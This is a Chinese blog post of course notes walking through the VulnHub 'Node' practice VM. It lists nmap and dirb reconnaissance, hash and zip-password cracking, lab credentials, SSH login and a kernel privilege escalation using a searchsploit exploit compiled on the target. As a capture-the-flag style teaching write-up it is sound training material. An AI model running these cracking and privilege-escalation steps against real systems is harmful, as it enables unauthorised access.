---
title: "VulnHub Node 靶机实战：3000 端口的 Node 应用"
date: 2026-10-19T07:00:00+08:00
draft: false
categories: ["课程笔记", "靶机实战"]
tags: ["Linux", "靶机", "渗透", "课程笔记"]
summary: "先扫网段再全端口（-p-）定位 3000 端口、dirb / dirbuster 目录枚举到 /login、Node 应用的信息泄露与后台进入，以及提权路径。"
description: "先扫网段再全端口（-p-）定位 3000 端口、dirb / dirbuster 目录枚举到 /login、Node 应用的信息泄露与后台进入，以及提权路径。"
ShowToc: true
---

> 来源：Linux 服务基础课程讲义（`node.pdf`，共 10 页）。由 PDF 转为 Markdown 并抽取原文图片，仅整理排版与章节层级，正文内容未改写。

## ！nmap -sP 192.168.133.0/24

## ！sudo nmap -A 192.168.133.129

### @-A 全面扫描

### @-p- -p 1-65535

![VulnHub Node 靶机实战 示意图 1](/images/linux-notes/vulnhub-node/img-01.webp)

~ 目录扫描/login

## ！dirb http://192.168.133.129:3000

## /usr/share/dirb/wordlists/big.txt -f

## ！dirbuster

![VulnHub Node 靶机实战 示意图 2](/images/linux-notes/vulnhub-node/img-02.webp)

！暴力破解X

## @ 用户枚举--通过已知的账号，和伪造的账号，根据回显判断，伪造

## 的账号是否存在

![VulnHub Node 靶机实战 示意图 3](/images/linux-notes/vulnhub-node/img-03.webp)

！查看源代码

![VulnHub Node 靶机实战 示意图 4](/images/linux-notes/vulnhub-node/img-04.webp)

![VulnHub Node 靶机实战 示意图 5](/images/linux-notes/vulnhub-node/img-05.webp)

## ！尝试破解密码

![VulnHub Node 靶机实战 示意图 6](/images/linux-notes/vulnhub-node/img-06.webp)

~ 破译密码

## ！hash-identifier （判断加密类型）

![VulnHub Node 靶机实战 示意图 7](/images/linux-notes/vulnhub-node/img-07.webp)

## ！www.cmd5.com

![VulnHub Node 靶机实战 示意图 8](/images/linux-notes/vulnhub-node/img-08.webp)

## @ 账号(并不是管理员)

tom/spongebob mark/snowflake~ 目录遍历

![VulnHub Node 靶机实战 示意图 9](/images/linux-notes/vulnhub-node/img-09.webp)

![VulnHub Node 靶机实战 示意图 10](/images/linux-notes/vulnhub-node/img-10.webp)

@ myP14ceAdm1nAcc0uNT/manchester

![VulnHub Node 靶机实战 示意图 11](/images/linux-notes/vulnhub-node/img-11.webp)

## ~ file 查看文件类型

@ 通过文件密文判断--base64编码

## ~ 破解base64编码

！base64 -d -i myplace.backup > test-d 解码操作-i  忽略换行符

![VulnHub Node 靶机实战 示意图 12](/images/linux-notes/vulnhub-node/img-12.webp)

~ zip压缩包！unzip test

![VulnHub Node 靶机实战 示意图 13](/images/linux-notes/vulnhub-node/img-13.webp)

![VulnHub Node 靶机实战 示意图 13](/images/linux-notes/vulnhub-node/img-13.webp)

~爆破加密压缩文件！fcrackzip -u -D -p ./rockyou.txt test@magicword

![VulnHub Node 靶机实战 示意图 14](/images/linux-notes/vulnhub-node/img-14.webp)

![VulnHub Node 靶机实战 示意图 15](/images/linux-notes/vulnhub-node/img-15.webp)

![VulnHub Node 靶机实战 示意图 16](/images/linux-notes/vulnhub-node/img-16.webp)

## ~ app.js

！mark:5AYRft73VtFpc84k

![VulnHub Node 靶机实战 示意图 17](/images/linux-notes/vulnhub-node/img-17.webp)

~ ssh登陆！ssh mark@192.168.133.129

## ~ 查看发行版本

！cat /etc/issue

![VulnHub Node 靶机实战 示意图 18](/images/linux-notes/vulnhub-node/img-18.webp)

~ 本地提权

![VulnHub Node 靶机实战 示意图 19](/images/linux-notes/vulnhub-node/img-19.webp)

！searchsploit -m 44298！scp复制脚本@scp 44298.c mark@192.168.133.129:/tmp/44298.c

![VulnHub Node 靶机实战 示意图 20](/images/linux-notes/vulnhub-node/img-20.webp)

~ 编译脚本执行提权！gcc 44298.c -o test

![VulnHub Node 靶机实战 示意图 21](/images/linux-notes/vulnhub-node/img-21.webp)

！./test

![VulnHub Node 靶机实战 示意图 22](/images/linux-notes/vulnhub-node/img-22.webp)

![VulnHub Node 靶机实战 示意图 23](/images/linux-notes/vulnhub-node/img-23.webp)
